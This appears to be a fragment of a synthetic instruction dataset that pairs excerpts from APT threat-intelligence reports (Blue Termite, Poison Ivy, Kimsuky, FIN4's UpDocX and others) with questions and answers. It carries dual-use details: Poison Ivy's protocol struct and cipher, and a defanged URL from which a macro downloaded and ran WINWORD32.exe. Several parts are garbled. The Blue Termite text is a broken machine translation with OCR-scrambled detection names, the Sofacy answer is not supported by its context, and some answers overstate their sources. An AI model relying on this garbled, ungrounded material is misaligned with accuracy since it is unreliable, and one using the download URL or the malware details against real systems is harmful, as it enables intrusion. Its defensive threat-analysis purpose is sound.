    "instruction": "Context: Blue Termite\nBlue Termite is an APT attack the Japan 100% targeted, while the cyber attacks on Japanese pension mechanism also that it part of such efforts, the target is emphasized that it is \"Japan as a whole\" rather than by the same mechanism. It is assumed only attack is discovered in the same mechanism by chance thanks to information has been leaked, including the government agencies and news organizations, defense-related, energy-related, aerospace, financial, chemical,\nmanufacturing, research and academic institutions, further Until cloud servers of information and communication business, it revealed that at least 300 sites have been invaded by malware Blue Termite.\nRintaro Mr. Kawai Inc. Kaspersky President\nIshimaru Inc. Kaspersky information security lab security researcher\nBlue Termite is one of the attacks that the attacker group called \"CloudyOmega (Claudio mega)\" is deployed. The targeted attacks-mail and malware have been last fall, reported by Symantec and Trend Micro.\nFor example, in an e-mail that the source is \"health insurance union secretariat\", the file is attached that was disguised as a Word document file \"Notice of health insurance\", actually a self-extracting executable\norganization more than 300 locations in Japan, you have to be the thing that has been invaded by this malware.\nNote that this figure are those based on the number of unique IP addresses, it is going to be considered when using multiple IP addresses at the same organization. Also, its not always have evolved into activities such as information theft at all say (do not know), but, at least, malware is successful in the invasion, C & C number organization of considerable communication with the server has occurred I would that there.\nAfter the\nmalware infection, it called for confirmation of whether the environment is or attack. Directories and files in the PC, and to reference the operation to that\nAnd that in a business that provides cloud services, believed to have been stolen until the administrator authority of the mission-critical server body.\nIn fact, the\ncustomer web site that is operating on its cloud service, Blue Termite C & C server is installed a large number, it is found that Kaspersky Lab has 80 reviews alone was able to parse domain has been abused It is other,\ndomestic several thousand domain in May point in time you have to be in the hands of the attacker.\nC & C servers but were often placed abroad far, Blue those domestic C & C servers in Termite is used, the ratio is up to 93%. The communication of malware that had penetrated into the tissue, and that is difficult to judgment and cut off by the standard of overseas server.\nThe Blue Termite information of cloud services business who are under attack of, already it is assumed has to offer from Kaspersky Lab to the police, that should know at least the operators. However, at present business who announced that its I have not even one company.\nIn Kaspersky Lab, behavior after infection of these malware, back doors and hacking tools are using, from the commonality of the C & C server, cyber attacks on this time discovered the Japan pension mechanism, a series of Blue Termite that has continued from last fall\nDescription and was determined to be a part of the attack. \"Our will discard the confidence unfounded such as okay, everyone recognizes the fact that there is likely to be a target,\" it can be appealed the need.\nIt is to be noted that it is assumed to be suspect infection If impersonation files and malware names, such as the following, the tool is found in the PC.\nbecause in some cases the same name of the file exists, but is not that these are found PC is sure to infection, that it is better to suspected infection\nIn addition, the malware used in the Blue Termite is, in the Kaspersky Lab product to detect the name, such as the fallowing.\n\u0141\u0141\u0141\u0141\u0141\u0141\u0141\nBa.-.i=kdoor.'!Nln32.AGeF1t:\nBR.fkdoor.'iNin.3-2.ll:mdn.\u0141i\nnofan-Do'i.!'n1oader.Win:32.A\u00a3enlf\nTra,l}an.Win32.Agenil:\nHIEUR':Bit\u0141clao.r.WIFl:32-Generle\nHIEUR..Y,ojan.Wina2.1JeMJii=: l-!.i'.lekTixil.Win:32.ti.,S,\u0141li'lt t-lackiool.WIFl:32.Mlmlkati .. gen\nH.ac\u0141Tool.WIFl:32.WlnCred\nHa\u00a2\u0141TQQI.Win64.Aig\u0141iflit l-!!a\u00a2kT,x, l,Win64.. MimikJitl-\u0141n oot:-a-i.ilrus:IPS'aVTool.Viliin3i2. Messen\noot-;a-i.ilrm:IP'SWTool.V!liin:!i2. NetlJ'as\u00a3; n0h(l-\u0141il'tl,Q:Ri$kT\u00a2.OI.WinJ.2;.P-W:Oi,JMp uos:Dangerou50bjec.t.Multl.Genertc\n\u0141\u0141\u0141\u0141\u0141\u0141\u0141\nDetection name in the Kaspersky Lab products\nAnswer this question: What specific techniques did the Blue Termite APT employ to escalate privileges and gain access to critical systems, and how did they leverage cloud services in their attack strategy?",
    "output": "After initial infection, the Blue Termite malware performed reconnaissance to confirm the environment and determine if further attacks were feasible. It scanned directories and files on the infected PCs and referenced operations within businesses providing cloud services. The attackers successfully stole administrator authority for mission-critical servers, allowing them to install C&C servers on customer websites hosted on these cloud services. This strategy enabled the attackers to control a significant number of domains, with Kaspersky Lab identifying over 80 domains being abused. By leveraging cloud services, the attackers expanded their control and increased the difficulty of detection and mitigation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why do nation-state attackers prefer to use a remote system management tool rather than custom data format parsers in their malware? What implications does this have for cybersecurity defenses?",
    "output": "Nation-state attackers prefer to use a remote system management tool rather than custom data format parsers because they have sufficient resources to store large amounts of data and aim to avoid attracting attention. Custom data format parsers might not find all valuable data and could attract extra attention from security software. By using a generic remote system management tool, they can copy any information they need, even if it causes some redundancy. However, copying large volumes of information might slow down network connections and attract attention, especially in countries with poor internet infrastructure. This preference has implications for cybersecurity defenses, as it requires monitoring for unusual data transfers and implementing robust network traffic analysis to detect such activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nRemote access tools (RATs) may be the hacker's equivalent of training wheels, as they are often regarded in IT security circles. But dismissing this common breed of malware could be a costly mistake. Despite their reputation as a software toy for novice \"script kiddies,\" RATs remain a linchpin of many sophisticated cyber attacks.\nRequiring little technical savvy to use, RATs offer unfettered access to compromised machines. They are deceptively simple\u2014attackers can point and click their way through the target's network to steal data and intellectual property. But they are often delivered as key component of coordinated attacks that use previously unknown (zero-day) software flaws and clever social engineering.\nEven as security professionals shrug off the threat, the presence of a RAT may in itself indicate a targeted attack known as an advanced persistent threat (APT). Unlike malware focused on opportunistic cybercrime (typically conducted by botnets of comprised machines), RATs require a live person on the other side of the attack.\nThis report spotlights Poison Ivy (PIVY), a RAT that remains popular and effective a full eight years after its release, despite its age and familiarity in IT security circles. In conjunction with the study, FireEye\u00ae is releasing Calamine, a set of free tools to help organizations detect and examine Poison Ivy infections on their systems.\nPoison Ivy has been used in several high-profile malware campaigns, most notoriously, the 2011 compromise of RSA SecurID data. The same year, Poison Ivy powered a coordinated attack dubbed Nitro against chemical makers, government agencies, defense firms and human-rights groups.\nSeveral ongoing cyber attack campaigns use Poison Ivy, including these:\n\u2022 admin@338\u2014Active since 2008, this campaign mostly targets the financial services industry, though we have also seen activity in the telecom, government, and defense sectors.\n\u2022 th3bug\u2014First detected in 2009, this campaign targets a number of industries, primarily higher education and healthcare.\n\u2022 menuPass\u2014Also launched in 2009, this campaign appears to originate from China, targeting U.S. and overseas defense contractors.\nUnderstanding why Poison Ivy remains one of the most widely used RATs is easy. Controlled through a familiar Windows interface, it offers a bevy of handy features: key logging, screen capturing, video capturing, file transfers, password theft, system administration, traffic relaying, and more.\nAnd Poison Ivy is so widely used that security professionals have a harder time tracing attacks that use the RAT to any particular attacker.\nWe hope to eliminate some of that anonymity with the FireEye Calamine package. The package, which enables organizations to easily monitor Poison Ivy's behavior and communications, includes these components:\n\u2022 PIVY callback-decoding tool (ChopShop module)\n\u2022 IVY memory-decoding tool (Immunity Debugger PyCommand script)\nChopShop1 is a new framework developed by the MITRE Corporation for network-based protocol decoders that enable security professionals to understand actual commands issued by human operators controlling endpoints. The FireEye PIVY module for ChopShop decrypts Poison Ivy network traffic.\nPyCommands, meanwhile, are Python scripts that automate tasks for Immunity Debugger, a popular tool for reverse-engineering malware binaries.2 The FireEye PyCommand script dumps configuration information from a running PIVY process on an infected endpoint, which can provide additional telemetry about the threat actor behind the attack.\nFireEye is sharing the Calamine tools with the security community at large under the BSD 2-Clause License3 for both commercial and non-commercial use worldwide. The tools are available for download at the following locations:\n\u2022 https://github.com/fireeye/pycommands\n\u2022 https://github.com/fireeye/chopshop\nBy tracking the PIVY server activity, security professionals can find these telltale indicators:\n\u2022 The domains and IPs used for Command and Control (CnC)\n\u2022 The attacker's PIVY process mutex\n\u2022 The attacker's PIVY password\n\u2022 The launcher code used in the malware droppers\n\u2022 A timeline of malware activity\nThis report explains how Calamine can connect these and other facets of the attack. This evidence is especially useful when it is correlated with multiple attacks that display the same identifying features.\nCombining these nuts-and-bolts details with big-picture intelligence can help profile threat attackers and enhance IT defenses.\nCalamine may not stop determined attackers that use Poison Ivy. But it can make their criminal endeavors that much more difficult.\nMedium Headline: Build and implantation\nThe Poison Ivy builder kit allows attackers to customize and build their own PIVY server, which is delivered as mobile code to a target that has been compromised, typically using social engineering. Once the server executes on a target's endpoint, it connects to a PIVY client installed on the attacker's machine, giving the attacker control of the target system.\nThe PIVY server code can executed on the target endpoint in a number of ways, depending on how the attacker configured it. In the most common configuration, the PIVY server divides its code into two parts:\n4 Joe Stewart. \"The Sin Digoo Affair.\" February 2012.\n5 Nart Villeneuve. \"Trends in Targeted Attacks.\" October 2011.\n6 eWeek. \"Northrop Grumman, L-3 Communications Hacked via Cloned RSA SecurID Tokens.\" June 2011.\n7 RSA FraudAction Research Labs. \"Anatomy of an Attack.\" April 2011. 8 CNET. \"Attack on RSA used zero-day Flash exploit in Excel.\" April 2011.\n9 Brian Krebs. \"Who Else Was Hit by the RSA Attackers?\" October 2011. 10 Eric Chien and Gavin O'Gorman. \"The Nitro Attacks: Stealing Secrets from the Chemical Industry.\" October 2011.\n11 GovCERTUK Computer Emergency Response Team. \"Targeted Email Attack Alert.\" October 2011.\n12 Symantec. \"Java Zero-Day Used in Targeted Attack Campaign.\" August 2012.\n13 Yichong Lin. \"IE Zero Day is Used in DoL Watering Hole Attack.\" May 2013.\n\u2022 Initialization and maintenance code\n\u2022 Networking code\nThe initialization and maintenance code is injected into the already-running explorer.exe process.\nDepending on how the attacker configures it, the networking code launches a hidden Web browser process (the system's default browser) and injects itself into that process. The networking code then remotely downloads (from the attacker's PIVY client as shellcode) the rest of the code and data it needs for its features and functionality. The new code executes on the target's endpoint within the\ncontext of the target process. All of PIVY's global variables, configuration details, and function pointers are stored in a C-style struct (data\nstructure), which is also injected into the target processes in both the PIVY networking code and initialization and maintenance code.\nThis distinct characteristic has the side effect of having every CALL instruction and global variable address being referenced as an offset to a register when looking at the code's disassembly. The code injected into explorer.exe is peculiar in that, unlike most malware-injected code, this code is injected function by function\u2014 each with its own memory region, filling in the proper function pointers in its struct. If the \"persistence\" PIVY option is enabled, a watchdog thread is also injected into explorer.exe, which automatically restarts the PIVY server process if it is unexpectedly terminated by the target's operating system. PIVY's keylogging function, if enabled, is also injected into explorer.exe.\nFigure 1: PIVY server configuration details being reported to the PIVY client\nPoison Ivy features a complex, custom network protocol over TCP. Most of this communication is encrypted using the Camellia cipher with a 256-bit key.14 The key is derived from a password provided by the attacker when building the PIVY server. The password, \"admin\" by default, can be provided in plain text or as hex-ASCII. The password is zero-padded to 32 bytes (256 bits). The key is validated at the beginning of the TCP session with a challenge-response algorithm. The PIVY server sends 256 bytes of randomly generated data to the PIVY client which, in turn, encrypts the data using the key and sends it back to the PIVY server for validation. Much of the data sent throughout PIVY's communications is also compressed before encryption using Microsoft's LZNT1 compression algorithm,15 which PIVY utilizes through the Windows RtlCompressBuffer API. The protocol operates by sending encrypted data in chunks that are prepended with the following encrypted 32-byte header:\nstruct PI_chunk_header { int command_id; int stream_id; int padded_chunk_size; int chunk_size; int decompressed_chunk_size; long total_stream_size; int padding;\n};\nThe PI_chunk_header structure is arranged as follows: command_id\u2014This member identifies which feature of PIVY the chunked data is related to. stream_id\u2014This member identifies which stream this flow corresponds to. PIVY's protocol supports sending multiple streams of data simultaneously. padded_chunk_size\u2014Because Camellia is a 16-byte block cipher, padding is utilized in the headers and in the data chunks.\nchunk_size\u2014Chunks are assembled into a stream of data that could be anything, such as a transferred file, shellcode to execute, a screen capture bitmap file, or raw data. decompressed_chunk_size\u2014If this size is different from the chunk_size, the chunk is compressed using LZNT1. total_stream_size\u2014This member specifies the total size of the data being sent for the related command_id.\npadding\u2014This member specifies the zero padding (up to 32 bytes).\nFigure 5: PIVY initial communication protocol\nFigure 6: PIVY data chunks with headers\nRead the text above and answer this question: How does Poison Ivy's custom network protocol operate, and what encryption and compression methods does it utilize?",
    "output": "Poison Ivy features a complex, custom network protocol over TCP, with most of its communication encrypted using the Camellia cipher with a 256-bit key. The key is derived from a password provided by the attacker when building the PIVY server. The protocol operates by sending encrypted data in chunks that are prepended with a 32-byte header. Much of the data sent throughout PIVY's communications is also compressed before encryption using Microsoft's LZNT1 compression algorithm, which PIVY utilizes through the Windows RtlCompressBuffer API. This combination of encryption and compression makes it challenging to intercept and analyze Poison Ivy's network traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the significance of the C2 domain 'qf.laoscript.org' in the context of the htpRAT attack, and what insights can be gained from its registration information?",
    "output": "The C2 domain 'qf.laoscript.org' is significant because it is the command and control host for the htpRAT malware. The registration information for this domain is interesting as it includes the name 'John Durdin,' which appears on multiple domains but with different email addresses. The use of a .NET domain for laoscript and the mimicry of the legitimate laoscript website, which helps with Lao language text input, indicates active targeting and social engineering efforts. The domain has been registered since 2014, suggesting long-term control by the actor and potential use in other attack campaigns. Additionally, the domain has been connected to PlugX malware samples, indicating a history of malicious activity and a possible shift from using PlugX to the newer htpRAT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. Overview\nThe Kimsuky threat group, deemed to be supported by North Korea, has been active since 2013. At first, they attacked North Korea-related research institutes in South Korea before attacking a South Korean energy corporation in 2014. Cases of attacks against countries other than South Korea have also been identified since 2017. (<https://atip.ahnlab.com/ti/contents/threat-actor/detail?tagSeq=15>)[1] The group usually employs spear phishing attacks against the national defense sector, defense industries, the press, the diplomatic sector, national organizations, and academic fields to steal internal information and technology from organizations. (<https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=31442>)[2] (This link is only available in Korean.)\nEven until recently, the Kimsuky group was still mainly employing spear phishing attacks to gain initial access. What makes the recent attacks different from the previous cases is that more LNK shortcut-type malware are being used instead of malware in Hangul Word Processor (HWP) or MS Office document format. The threat actor led users to download a compressed file through attachments or download links within spear phishing emails. When this compressed file is decompressed, it yields a legitimate document file along with a malicious LNK file.\nASEC is monitoring the Kimsuky group's attacks using LNK-type malware and is continuously posting identified cases of attacks on the ASEC Blog. The Kimsuky group installs remote control malware to control the infected system after completing such steps to\ngain initial access. Malware used by the Kimsuky group not only include custom-made such as AppleSeed and PebbleDash (<https://asec.ahnlab.com/en/30532/>)[3], but also open-source or commercial malware such as XRat (<https://asec.ahnlab.com/en/31089/>)[4], HVNC (<https://asec.ahnlab.com/en/27346/>)[5], Amadey (<https://asec.ahnlab.com/en/40483/>)[6], and Metasploit Meterpreter (<https://asec.ahnlab.com/en/53046/>)[7]. After gaining control, the threat actor ultimately uses RDP or installs Google's Chrome Remote Desktop (<https://asec.ahnlab.com/en/55145/>)[8] to exfiltrate information from the infected system.\nHere we analyze Amadey and RftRAT which were recently found being distributed. Amadey and RftRAT were constantly used throughout 2023 alongside XRat. However, recent types showed that they were created with AutoIt. This post also covers Infostealers additionally installed by the Kimsuky group using remote control malware. While remote control-type malware continuously change, the malware installed through these have not changed much in the attacks in 2023.\n\nBased on the above text, answer a question. Why did the Kimsuky threat group shift from using HWP or MS Office document format malware to LNK shortcut-type malware in their recent spear phishing attacks? How does this change affect the initial access strategy of the group?",
    "output": "The Kimsuky group shifted to using LNK shortcut-type malware instead of HWP or MS Office document format malware to gain initial access. This change involves leading users to download a compressed file through attachments or download links within spear phishing emails. When decompressed, the file contains a legitimate document file along with a malicious LNK file. This strategy allows the threat actor to exploit user trust in legitimate documents while delivering the malicious payload more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 27 Pingbacks & Trackbacks\nFebruary 13, 2016 5:13 AM\nFebruary 13, 2016 1:09 PM\nFebruary 14, 2016 8:38 AM\n..:: Frog in the box ::..\nFebruary 15, 2016 5:56 AM\nFebruary 15, 2016 6:04 AM\nFebruary 15, 2016 6:05 AM\nFebruary 15, 2016 7:47 AM\nFebruary 15, 2016 10:31 AM\nFebruary 15, 2016 10:32 AM\nFebruary 15, 2016 12:17 PM\nFebruary 15, 2016 3:17 PM\nFebruary 15, 2016 5:08 PM\nFebruary 15, 2016 9:10 PM\nFebruary 15, 2016 9:27 PM\nFebruary 16, 2016 5:10 AM\nFebruary 16, 2016 9:53 AM\nFebruary 16, 2016 10:40 AM\nFebruary 17, 2016 4:56 AM\nFebruary 17, 2016 4:59 AM\nFebruary 17, 2016 1:45 PM\nFebruary 17, 2016 7:06 PM\nFebruary 18, 2016 9:42 PM\nFebruary 20, 2016 2:52 PM\nFebruary 21, 2016 6:56 PM\nFebruary 24, 2016 5:01 PM\nFebruary 24, 2016 5:53 PM\nMarch 1, 2016 1:18 AM\nPost Your Comment\nWebsite\nPost Comment\nBig Headline: About Palo Alto Networks\nPalo Alto Networks is the network security company. Our innovative platform allows enterprises, service providers, and government entities to secure their networks and safely enable the increasingly complex and rapidly growing number of applications running on their networks.\nThe core of Palo Alto Networks' platform is our next\u00adgeneration firewall, which delivers application, user, and content visibility and control integrated within the firewall through its proprietary hardware and software architecture. Palo Alto Networks products and services can address a broad range of network security requirements, from the datacenter to the network perimeter, as well as the distributed enterprise, which includes branch offices and a growing number of mobile devices.\nQ: How does the Sofacy group's use of the Linux malware Fysbis contribute to the success of their cyber espionage operations, and what implications does this have for Linux security?",
    "output": "The Sofacy group, also known as APT28 and Sednit, utilizes the Linux malware Fysbis as one of their preferred tools. Although Fysbis is not particularly sophisticated, the relative immaturity of Linux security, especially regarding malware, makes it an effective tool for the group. The success of Fysbis in Sofacy's operations highlights the need for enhanced security measures in Linux environments. This includes improving detection mechanisms, strengthening defenses against zero-day exploits, and increasing awareness among system administrators about the potential threats posed by Linux-based malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PROMETHIUM and NEODYMIUM: Parallel zero-day attacks targeting individuals in Europe\nWindows Defender ATP\nMicrosoft proactively monitors the threat landscape for emerging threats. Part of this job involves observing the activities of targeted activity groups, which are often the first ones to introduce new exploits and techniques that are later used by other attackers. The previous two volumes of the Microsoft Security Intelligence Report explored the activities of two such groups, code-named STRONTIUM and PLATINUM, which used previously unknown vulnerabilities and aggressive, persistent techniques to target specific individuals and institutions\u2014 often including military installations, intelligence agencies, and other government bodies.\nThis volume chronicles two activity groups, code-named PROMETHIUM and NEODYMIUM, both of which target individuals in a specific area of Europe. Although most malware today either seeks monetary gain or conducts espionage for economic advantage, both of these activity groups appear to seek information about specific individuals.\nIn May 2016, both PROMETHIUM and NEODYMIUM were observed to launch attack campaigns. These campaigns used completely distinct infrastructure and primary malware, which indicated a lack of association at the operational level. However, the similarity in the campaigns' victim locale, timing, and use of the same zero-day exploit prior to public disclosure strongly indicates that the activity groups may be related at a higher organizational tier.\nMicrosoft is sharing information about these groups to raise awareness of their activities, and to help individuals and organizations implement existing mitigation options that significantly reduce risk from these attack groups and other similar groups.\n\nAnswer this question based on the above context: Why did Microsoft conclude that the activity groups PROMETHIUM and NEODYMIUM might be related at a higher organizational tier despite using distinct infrastructure and primary malware? Explain the reasoning behind this conclusion.",
    "output": "Microsoft concluded that the activity groups PROMETHIUM and NEODYMIUM might be related at a higher organizational tier due to several key factors. Firstly, both groups launched attack campaigns in May 2016, indicating a temporal correlation. Secondly, they targeted individuals in a specific area of Europe, suggesting a geographical overlap in their interests. Lastly, both groups utilized the same zero-day exploit prior to its public disclosure. Despite using completely distinct infrastructure and primary malware, which indicated a lack of association at the operational level, the similarities in victim locale, timing, and exploit usage strongly suggested a potential relationship at a higher organizational level.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Bureau 121/ Guardians of Peace/ Dark Seoul\nAccording to defectors, Bureau 121 is one of six divisions of North Korea's General Bureau of Reconnaissance that is charged with cyber-intelligence operations. The bureau was created in 1998 and it consists of ~1800 handpicked hackers who are allegedly the \"most talented and rewarded personnel within the North Korean military\" according to a Reuters interview with a defector known as Jang Se-yul. Students are recruited directly from the University of Automation and paid relatively significant sums.\nNorth Korea uses cyber-warfare as a cost effective intelligence branch of their military. Many in North Korea see cyber-warfare as their strongest weapon. Bureau 121 most frequently targets South Korea, Japan, and the United States. Bureau 121 targets financial institutions and media companies. In one March 2014 attack, 30,000 South Korean servers associated with banking and media broadcasting outlets were damaged. These systems were infected with DarkSeoul malware and they displayed messages claiming that they were hacked by the Whois Team. In November 2014, Sony Pictures' email server was hacked by a group claiming to be called the Guardians of Peace, in response to the upcoming release of the movie \"The Interview\" because it portrays a story and portrayal that is unflattering to Kim Jong-un. An estimated 100 terabytes of data were exfiltrated from Sony before the Wiper Trojan was used to delete the servers. The information contained emails, unreleased films, employees' personal information and financial information. Threats were also made against Sony that contained imagery reminiscent of the September 11, 2001 attacks.\nThe FBI, Obama Administration, and the NSA have attributed the Sony breach to North Korea. Members of the press and some security researchers doubt the evidence\nattributing the Sony attack to North Korea. North Korea may not have been capable of exfiltrating hundreds of terabytes of data.\nThe Whois Team and the Guardians of Peace attacks are very similar. Both attacks were relatively unsophisticated and both attacks offered a moniker of a previously unheard of group. The procedure of each attack was to install malware through phishing campaigns, steal data, lock down the infected systems, display a banner message claiming responsibility, and then using malware to wipe the system.\nQuestion: How does Bureau 121 leverage cyber-warfare as a cost-effective intelligence branch, and what are the primary targets and methods used in their high-profile attacks?",
    "output": "Answer: Bureau 121 leverages cyber-warfare as a cost-effective intelligence branch by utilizing a team of approximately 1800 highly skilled hackers. They primarily target South Korea, Japan, and the United States, focusing on financial institutions and media companies. One notable attack in March 2014 involved infecting 30,000 South Korean servers with DarkSeoul malware, which displayed messages claiming responsibility by the 'Whois Team.' Another significant incident was the November 2014 hack of Sony Pictures' email server by a group calling themselves the 'Guardians of Peace,' in response to the film 'The Interview.' This attack resulted in the exfiltration of 100 terabytes of data and the use of a Wiper Trojan to delete the servers. The FBI, Obama Administration, and NSA attributed this breach to North Korea, although some members of the press and security researchers questioned the evidence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 5.1 Trojan.Lurker\nRSA\t\n  IR identified several malicious\t\n  files\t\n  that it refers to as Trojan.Lurker and Trojan.Lurker2.\t\n  This Trojan allowed the adversary to perform the\t\n  following\t\n  actions on the infected \t\n  systems:\n1. Execute commands via\t\n  cmd.exe\n2. Execute Files\n3. Upload/download files\n4. Traverse the file system\n5. Enumerate/terminate running processes.\nOne variant of this Trojan was UPX packed at 18,304 bytes whereas the second variant was not packed and was 48,000 bytes. The primary method of entrenchment was by hijacking the NTMSSVC service by replacing the legitimate DLL name there (ntmssvc.dll)\t\n  with one of\t\n  the malicious files. The characteristics of the discovered\t\n  Trojans are shown\t\n  below:\nBoth\t\n  variants of this Trojan\t\n  contained\t\n  configuration\t\n  data encrypted\t\n  at the end\t\n  of the file. Analysis shows that the data is encrypted using\t\n  a\t\n  modified version of the\t\n  DES\t\n  (ECB) algorithm. The same key is also used\t\n  to\t\n  encrypt all network communication. Between the two variants\t\n  that were discovered two DES keys\t\n  were found:\nMedium Headline: 5.2 Trojan.SurperhardCorp\nRSA\t\n  IR identified a Trojan family that it refers to as Trojan.SuperhardCorp. This Trojan allows the\t\n  adversary to perform the\t\n  following actions on an infected system:\n1. Execute commands/files\n2. Upload/download files\n3. Traverse the file system\n4. Enumerate/terminate running processes.\nThe primary method of entrenchment for this Trojan was a service named IRMON.\t\n  The Trojan communicates over TCP\t\n  port 443. The characteristics of the discovered Trojans are shown below:\nThe name of this Trojan comes from a\t\n  string that is hardcoded in all of these samples. Here is an example:\nQ: How did the Trojan.Lurker malware achieve persistence within the compromised systems, and what encryption method was used for its configuration data and network communications?",
    "output": "The Trojan.Lurker malware achieved persistence by hijacking the NTMSSVC service, replacing the legitimate DLL (ntmssvc.dll) with one of the malicious files. The configuration data at the end of both variants of the Trojan was encrypted using a modified version of the DES (ECB) algorithm. The same key was also used to encrypt all network communication. Two different DES keys were found across the two variants.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The UpDocX Malware\nDuring our research into FIN4's malicious macros, we identified a sample, d102693540b53f9a564e3a550f938709, which contains similar code to the malicious macros cited in previously documented samples, such as the form display and the subroutine uploadPOST, an example of which is given below:\nHowever, in our sample the macro code differs, in that it uses URLDownloadToFile to download an executable named WINWORD32.exe - this can be seen below.\nUsing this inbuilt Windows functionality, the macro downloads and executes a file located at the following URL:\nhttp://www.advantarlabs[.]com/plugins/extension-\u00adxtd/WINWORD32.exe\nDue to the command and control filename as shown in the htmlUpload function below, we refer to this malware as UpDocX:\nUpDocX was written in VB.NET and compiled without any attempts at obfuscating the source code. There is also no attempt in obfuscating C2 network traffic. It has limited functionality and appears to be a simple backdoor used solely for keylogging and uploading documents to designated C2 servers.\nThe attackers have, however, put some effort into avoiding detection and hindering investigations. UpDocX has a list of extensive clean-up functions responsible for eliminating evidence of compromise, which indicates a degree of caution often not observed in targeted attacks.\nWe believe that one of the authors of UpDocX may be a French speaker, based on naming conventions used in the malware.\nPwC threat intelligence customers can access a more detailed technical analysis of UpDocX, additional indicators associated with FIN4 and our most recent profile of the group, in report reference CTO-TAP-20150518-01A.\n[1] http://www.reuters.com/article/2015/06/23/us-hackers-insidertrading-idUSKBN0P31M720150623\n[2] https://www2.fireeye.com/rs/fireye/images/rpt-fin4.pdf\n[3] https://www.esentire.com/wp-content/uploads/2013/11/esentire_alert_20131108_DOCM.pdf\n[4] http://www.symantec.com/security_response/writeup.jsp?docid=2014-052813-3721-99&tabid=2\nTweet\n\u00ab Neutrino Exploit Kit delivers zero-detection Zeus Variant\nMain\n|\n\nAnswer this question based on the above context: How does the UpDocX malware, associated with the FIN4 threat actor, differ from previously documented malicious macros in terms of its execution and functionality? Additionally, what measures have been taken by the attackers to avoid detection and hinder investigations?",
    "output": "The UpDocX malware differs from previously documented malicious macros in that it uses the URLDownloadToFile function to download an executable named WINWORD32.exe from a specified URL. This executable is then run using built-in Windows functionality. The malware itself is written in VB.NET and lacks any attempts at obfuscating the source code or C2 network traffic. Its primary functionalities are keylogging and uploading documents to designated command and control (C2) servers. To avoid detection and hinder investigations, UpDocX includes extensive cleanup functions designed to eliminate evidence of compromise, indicating a level of caution not typically observed in targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Intro:\nAt CrowdStrike, \"Intelligence powers everything we do.\" This is not a corporate slogan, and it is not a marketing theme. It is the realization of having the most dedicated professionals focusing on solving problems that have real strategic, political, and financial impact on our customers. When we consider the problems facing our customers, we know that intelligence allows them to make key decisions that can mean the difference between disaster and triumph.\nIn the earliest days building CrowdStrike, we drew heavily on the concepts encompassed in Colonel John Boyd's OODA loop (OODA is an acronym for Observe, Orient, Decide, Act). It has been applied over the years to all manner of decision-making situations. The core of the OODA model is that a decision-making process is broken into phases, and in an adversarial encounter, two entities will go through the same process. Whichever entity goes through the process the fastest will likely prevail.\nThe reason that intelligence powers everything we do is that we seek to provide our customers with the ability to come to a decision (the last step of the OODA loop) before the adversary does, thus ensuring a favorable outcome. In intelligence circles, this is often referred to as decision advantage, and when dealing with adversaries trying to compromise your enterprise security, you want it.\nThroughout 2014, the activity monitored by CrowdStrike in the cyber domain was reflective of the events unfolding in the real world. This was punctuated in late 2014 with the now-infamous attack attributed to North Korean actors who levied destructive malware in a flagrant assault against a private entity. The actor in this case, which CrowdStrike has traced back to 2006, has a history of using destructive code against its targets. This actor again launched attacks in December against its usual adversary, the Republic of Korea.\nThe highly publicized events that initially suppressed the release of a movie deemed offensive by the Democratic People's Republic of Korea resulted in unprecedented awareness of the power that one adversary can wield against a target if they are suitably motivated.\nThis final chapter in 2014 closed out what was a year of attribution and adversary focus. In May, the U.S. Department of Justice, in concert with various partners including CrowdStrike researchers, disrupted the infrastructure of Gameover Zeus, a prolific\nbotnet that was the scourge of security practitioners across the globe. This disruption, which also impacted the nefarious CryptoLocker malware, provided the pause in adversary activity needed by law enforcement to levy charges and take legal action to permanently impact this malware.\nIn that same month, the U.S. Department of Justice charged five officers in the People's Liberation Army, the military organ of the People's Republic of China, with violating 18 U.S. Code \u00a7 1030. In June, CrowdStrike published a detailed analysis of an actor associated with the 12th Bureau of the Third General Staff Department. This report demonstrated a direct lineage between malware targeting a variety of western technology and government targets, and an individual in the Chinese intelligence service.\nThe events that unfolded in the South China Sea near the Paracel Islands, the emergence of ISIS, the unrest in Ukraine, and the disappearance of a Malaysian airliner all took on a cyber element. This is no coincidence. The nation-states of the world are all seeking the aforementioned decision advantage, and they know that the use of interconnected computers allows them to collect intelligence that gives them the ability to make informed decisions.\nOur customers rely on us to provide them intelligence to thwart these attacks and make informed decisions. This report will provide an overview of some of the intelligence analyzed by the CrowdStrike team over the past year.\nWrapping so much analysis into one report means a lot of tough decisions needed to be made on what to include. This report is structured to provide Key Findings first. Following the key findings are some graph data based on the patterns that emerged though visibility attained by the CrowdStrike team; this is meant to provide a snapshot of the dozens of adversaries tracked this year. In the Notable Activity section, we cover the three motivations that we see: Criminal, Targeted-Intrusion, and Hacktivist/Activist. We explore notable activity around zero-day exploits and event-specific operations conducted by these adversaries.\nThere are so many interesting actors we discovered this year, and even more that advanced from previous years; the Know the Adversary section contains interesting observations for just a few of the adversaries from the intelligence reports we publish through the subscription service. Finally, we provide an analysis of the 2013 report predictions for the past year, and a forecast of what to expect in 2015.\nMedium Headline: Key Findings:\n\u2022 Financial crime malware disruptions in 2014 changed the threat landscape by eliminating two prevalent malware families.\n\u2022 Since the high-profile Target breach in 2013, Point- of-Sale (PoS) malware became prevalent in the targeting of numerous retail organizations. Look for policy and process changes to mitigate this threat in 2015.\n\u2022 China-based adversaries continued to be the most prolific in the targeted intrusion space, but public reporting on a number of actors linked to Iran and Russia show the breadth of the threat from targeted intrusion operators.\n\u2022 High-profile events continued to drive a significant number of targeted intrusion campaigns. 